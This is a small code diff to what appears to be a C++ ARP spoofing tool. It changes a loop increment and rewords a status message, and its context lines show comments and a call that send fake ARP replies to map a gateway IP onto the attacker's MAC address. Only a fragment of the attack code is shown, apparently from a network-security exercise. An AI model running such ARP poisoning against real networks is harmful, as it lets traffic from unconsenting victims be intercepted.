@@ -33,7 +33,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	for(int i=1;i<argc/2;i+=2){
+	for(int i=1;i<argc/2;i+=1){
 		Ip sender_ip = Ip(argv[i*2]);
 		
 		Ip target_ip = Ip(argv[i*2+1]);
@@ -45,7 +45,7 @@ int main(int argc, char* argv[]) {
 		// arp spoofing !
 		// send fake arp reply 
 		// replace target ip(gateway ip) matches to attacker mac
-		cout << "Trying.. victim " << string(sender_mac) << " will send to attacker "<< string(attacker_mac) << 
+		cout << "Trying attack.. victim " << string(sender_mac) << " will send to attacker "<< string(attacker_mac) << 
 		" now !\n";
 		sendARPPacket(handle, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, false);
 
